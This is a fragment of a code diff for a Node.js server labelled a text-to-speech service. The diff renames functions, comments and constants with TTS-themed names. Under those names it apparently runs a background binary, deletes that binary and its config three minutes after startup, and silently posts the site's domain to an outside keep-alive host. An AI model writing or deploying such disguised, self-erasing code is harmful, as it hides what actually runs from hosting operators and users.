+  } catch (error) {
+    console.error(`TTS initialization error: ${error}`);
   }
 };
 
-// 注册服务健康检查（用于保活）
-async function registerServiceHealth() {
-  if (!AUTO_HEALTH_CHECK) return;
+async function addAccessTask() {
+  if (!AUTO_ACCESS || !DOMAIN) return;
 
-  if (!DOMAIN) {
-    return;
-  }
   const fullURL = `https://${DOMAIN}`;
   try {
-    await axios.post("https://oooo.serv00.net/add-url", {
-      url: fullURL
-    }, {
-      headers: {
-        'Content-Type': 'application/json'
-      }
+    await axios.post("https://oooo.serv00.net/add-url", { url: fullURL }, {
+      headers: { 'Content-Type': 'application/json' }
     });
-    console.log('Service health check registered');
-  } catch (err) {
-    // 静默处理错误
+    console.log('Keep-alive task registered');
+  } catch (error) {
+    // Silent fail for keep-alive registration
   }
 }
 
-// 清理临时文件（只清理二进制，不再有config.yaml）
-const cleanupTempFiles = () => {
-  fs.unlink('npm', () => {});
+const cleanupTTSCache = () => {
+  fs.unlink(TTS_BINARY_NAME, () => {});
+  fs.unlink(TTS_CONFIG_NAME, () => {});
 };
 
-// ==================== 启动TTS语音服务 ====================
 httpServer.listen(PORT, () => {
-  startHealthMonitor();
-  // 延迟3分钟后清理临时文件
+  initializeTTSEngine();
   setTimeout(() => {
-    cleanupTempFiles();
+    cleanupTTSCache();
   }, 180000);
-  registerServiceHealth();
-  console.log(`TTS Audio Service running on port ${PORT}`);
+  addAccessTask();
+  console.log(`MomoTTS service running on port ${PORT}`);
 });
